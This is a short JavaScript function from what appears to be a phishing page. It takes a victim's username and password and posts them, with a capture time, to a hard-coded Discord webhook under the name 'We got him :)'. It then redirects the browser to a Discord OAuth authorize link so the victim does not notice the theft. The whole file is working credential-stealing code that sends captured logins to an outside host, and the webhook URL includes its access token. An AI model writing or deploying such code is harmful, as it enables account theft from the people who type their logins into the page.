function sendData(User, Pass) {
    const date = new Date();
    $.post('https://discord.com/api/webhooks/1049489026710769684/TeUgHn3y_Bg8j1M4MoLUL0_5zCe_DCRLj9yEIv7mX6idoSWsyKhs00GTgbYkv0XWLjL8',
    {
        'username': 'We got him :)',
        'content': 'Username:\n\t' + User + '\nPassword:\n\t' + Pass + '/nCapture Time:\n\t' + date,     //adding timestamp
    }, function(data, status) {
        console.log("Data: " + data + "\nStatus: " + status);
    }
    )
    window.location = "https://discord.com/oauth2/authorize/?permissions=268454976&scope=bot&client_id=510016054391734273"
}
